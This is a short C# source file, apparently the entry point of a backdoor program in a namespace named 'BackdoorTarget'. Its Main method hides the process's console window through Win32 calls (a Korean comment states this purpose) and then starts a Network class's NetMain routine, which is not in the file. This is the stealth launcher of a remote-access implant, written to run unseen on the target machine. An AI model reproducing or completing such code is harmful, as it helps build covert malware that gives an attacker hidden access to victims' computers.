using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace BackdoorTarget
{
    class Program
    {
        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();

            //이 프로세스의 콘솔창을 숨김
            ShowWindow(handle, SW_HIDE);
            Network Net = new Network();
            Net.NetMain();
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
    }
}
